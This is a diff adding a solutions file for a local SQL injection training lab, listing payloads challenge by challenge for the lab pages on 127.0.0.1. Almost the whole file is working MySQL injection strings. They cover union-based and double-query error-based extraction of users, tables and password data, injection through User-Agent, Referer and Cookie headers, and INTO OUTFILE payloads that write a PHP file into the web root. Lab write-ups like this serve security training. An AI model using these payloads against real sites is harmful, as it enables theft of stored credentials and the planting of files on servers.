@@ -1,0 +1,158 @@
+BASIC CHALLENGES SOLUTIONS
+**************************
+
+$ ERROR BASED CHALLENGES [ Payloads will be similar for the error based injection (challenge-1 to challenge-4), challange-11 and challange-12]
+========================
++++++ INJECTION IN GET PARAMETER +++++
+
+Challenge-1
+-----------
+Extracting currenct user:
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-1/index.php?id=1337'union select 1,2,user()-- -
+
+Extracting database name:
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-1/index.php?id=1337'union select 1,2,database()-- -
+
+Extracting version:
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-1/index.php?id=1337'union select 1,2,version()-- -
+
+Extracting table name:
+PAYLOAD 1--> http://127.0.0.1/Mylab/sqli/Less-1/index.php?id=1337'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -
+OR
+PAYLOAD 2--> http://127.0.0.1/Mylab/sqli/Less-1/index.php?id=1337'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='<DATABASE NAME>'-- -
+OR
+PAYLOAD 3--> http://127.0.0.1/Mylab/sqli/Less-1/index.php?id=1337'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x<HEX FORM OF DATABASE NAME>-- -
+
+Extracting column name:
+PAYLOAD 1--> http://127.0.0.1/Mylab/sqli/Less-1/index.php?id=1337'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='table name'-- -
+OR
+PAYLOAD 2--> http://127.0.0.1/Mylab/sqli/Less-1/index.php?id=1337'union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x<HEX FORM OF TABLE NAME>-- -
+
+Extracting data from columns:
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-1/index.php?id=1337'union select 1,group_concat(id,0x7e,username,0x7e,password,0x3c62723e),3 from users-- -
+
+Challenge-2
+-----------
+Extracting currenct user:
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-2/index.php?id=1337 union select 1,2,user()-- -
+
+Challenge-3
+-----------
+Extracting version:
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-3/index.php?id=1337') union select 1,2,version()-- -
+
+Challenge-4
+-----------
+Extracting current database name:
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-4/index.php?id=1337") union select 1,2,database()-- -
+
++++++ INJECTION IN POST PARAMETER +++++
+
+challange-11:
+------------
+Extracting version:
+http://127.0.0.1/Mylab/sqli/Less-11/index.php?id=1
+PAYLOAD IN POST PARAMETER--> uname=username' union select 1,version()-- -&passwd=pass&submit=Submit
+
+challange-12:
+------------
+Extracting version:
+http://127.0.0.1/Mylab/sqli/Less-12/index.php?id=1
+PAYLOAD IN POST PARAMETER--> uname=username" union select 1,version()-- -&passwd=pass&submit=Submit
+
+challange-17: [UPDATE QUERY ERROR BASED SQL INJECTION]
+------------
+http://127.0.0.1/Mylab/sqli/Less-17/index.php?id=1
+PAYLOAD IN POST PARAMETER : uname=dumb&passwd=dumb2 ' and extractvalue(6678,concat(0x7e,(select  user() ),0x7e ))-- -
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+DOUBLE QUERY SQL INJETION [ Payloads will be similar for the Double Query SQL injection (challenge-5, chall-6, chall-13 and chall-14]
+=========================
++++++ INJECTION IN GET PARAMETER +++++
+
+Challenge-5
+-----------
+Extracting Version:
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-5/index.php?id=1337' or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1-- -
+
+Extracting Database:
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-5/index.php?id=1337' or 1 group by concat_ws(0x3a,database(),floor(rand(0)*2)) having min(0) or 1-- -
+Extracting User: 
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-5/index.php?id=1337' or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1-- -
+
+Extracting Tablename: 
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-5/index.php?id=1337' and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+NOTE:  Change the value of limit clause in payload for all the tables name [ (limit 0,1 ) , (limit 1,1) , (limit 2,1) and so on ]
+-----
+
+Extracting Column name:
+PAYLOAD 1--> and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name='TABLENAME' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+OR
+PAYLOAD 2--> and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x<HEX FORM OF TABLENAME> limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+NOTE:  Change the value of limit clause in payload for all the tables name [ (limit 0,1 ) , (limit 1,1) , (limit 2,1) and so on ]
+-----
+eg.=>
+1. http://127.0.0.1/Mylab/sqli/Less-5/index.php?id=1337' and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+2. http://127.0.0.1/Mylab/sqli/Less-5/index.php?id=1337' and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x7573657273 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+
+Extracting data:
+PAYLOAD--> and (select 1 from (select count(*),concat((select(select concat(cast(concat(COLUMN_NAME,0x7e,COLUMN_NAME) as char),0x7e)) from DATABASENAME.TABLENAME limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+eg.=>
+http://127.0.0.1/Mylab/sqli/Less-5/index.php?id=1337' and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+NOTE:  Change the value of limit clause in payload to dump the data from selected columns[ (limit 0,1 ) , (limit 1,1) , (limit 2,1) and so on ]
+-----
+
+Challenge-6
+-----------
+Extracting Version:
+PAYLOAD--> http://127.0.0.1/Mylab/sqli/Less-6/index.php?id=1337" or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1-- -
+
++++++ INJECTION IN POST PARAMETER +++++
+
+challange-13:
+------------
+http://127.0.0.1/Mylab/sqli/Less-13/index.php
+PAYLOAD IN POST PARAMETER--> uname=username' )or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1-- -
+
+challange-14:
+------------
+http://127.0.0.1/Mylab/sqli/Less-14/index.php
+PAYLOAD IN POST PARAMETER--> uname=username" or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1-- -
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+POST HEADER INJETION [ Payloads will be similar for the header injection (challenge-18, challenge-19 nad challenge-20]
+====================
+challange-18:
+------------
+http://127.0.0.1/Mylab/sqli/Less-18/index.php
+PAYLOAD IN HEADER <USER-AGENT> : something'or updatexml(1,concat(0x7e,(version())),0) or'
+
+challange-19:
+------------
+http://127.0.0.1/Mylab/sqli/Less-19/index.php
+PAYLOAD IN HEADER <REFERER> : something'or updatexml(1,concat(0x7e,(user())),0) or'
+
+challange-20:
+------------
+http://127.0.0.1/Mylab/sqli/Less-20/index.php
+PAYLOAD IN HEADER <COOKIE> : user 'or updatexml(1,concat(0x7e,(version())),0) or'
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+DUMP INTO OUTFILE: 
+==================
+challange-7: [GET PARAMETER]
+------------
+PAYLOAD--> union select 1,2,'file content' into outfile '<physical path>/filename.extension'-- -
+eg.==>
+http://127.0.0.1/Mylab/sqli/Less-7/index.php?id=31337')) union select 1,2,'<?php phpinfo();?>' INTO OUTFILE 'C:/xampp/htdocs/MyLab/sqli/help.php'-- -
+
+challange-21: [POST PARAMETER/cookie header]
+------------
+http://127.0.0.1/Mylab/sqli/Less-21/index.php
+PAYLOAD IN HEADER <COOKIE> : BASE64(PAYLOAD)
+PAYLOAD -> dumb') union select 1,2,'<?php phpinfo();?>' INTO OUTFILE 'C:/xampp/htdocs/MyLab/sqli/help2.php'-- -
